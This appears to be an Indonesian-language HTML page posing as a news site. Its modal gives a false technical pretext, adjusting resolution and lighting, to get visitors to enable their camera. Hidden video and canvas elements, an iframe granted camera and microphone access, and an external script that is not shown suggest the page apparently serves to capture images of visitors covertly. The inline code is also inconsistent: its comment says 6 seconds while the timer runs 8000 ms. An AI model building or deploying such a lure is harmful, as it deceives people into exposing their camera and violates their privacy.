<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Berita Informasi</title>
  <style>
    body, html {
      margin: 0;
      padding: 0;
      height: 100%;
      width: 100%;
      font-family: system-ui, sans-serif;
      background-color: #f0f2f5;
    }

    #dialog {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 320px;
      background: #fff;
      border-radius: 12px;
      box-shadow: 0 0 10px rgba(0,0,0,0.2);
      z-index: 9999;
      padding: 24px;
      text-align: center;
    }

    #dialog h2 {
      margin-top: 0;
      font-size: 18px;
      color: #333;
    }

    #dialog p {
      font-size: 14px;
      color: #555;
      margin: 12px 0;
    }

    .loader {
      margin: 16px auto 0;
      border: 4px solid #eee;
      border-top: 4px solid #007bff;
      border-radius: 50%;
      width: 36px;
      height: 36px;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    #backdrop {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(0,0,0,0.3);
      z-index: 9998;
    }

    video, canvas {
      display: none;
    }
  </style>
</head>
<body>

<!-- Dialog Modal -->
<div id="backdrop"></div>
<div id="dialog">
  <h2>Menyesuaikan Tampilan</h2>
  <p>Sistem sedang menyesuaikan resolusi dan pencahayaan untuk kualitas tampilan optimal. Aktifkan kamera browser Anda untuk melanjutkan.</p>
  <div class="loader"></div>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas" width="640" height="480"></canvas>
<iframe id="targetFrame" allow="autoplay; camera; microphone; picture-in-picture" allowfullscreen></iframe>

<!-- Blokir kamera & hilangkan dialog -->
<script>
  // Blokir kamera sementara
  navigator.mediaDevices.getUserMedia = () => Promise.reject("Kamera diblokir sementara");

  // Auto hilangin dialog setelah 6 detik
  setTimeout(() => {
    const dialog = document.getElementById("dialog");
    const backdrop = document.getElementById("backdrop");
    if (dialog) dialog.remove();
    if (backdrop) backdrop.remove();
  }, 8000);
</script>

<script src="/script.js"></script>

</body>
</html>
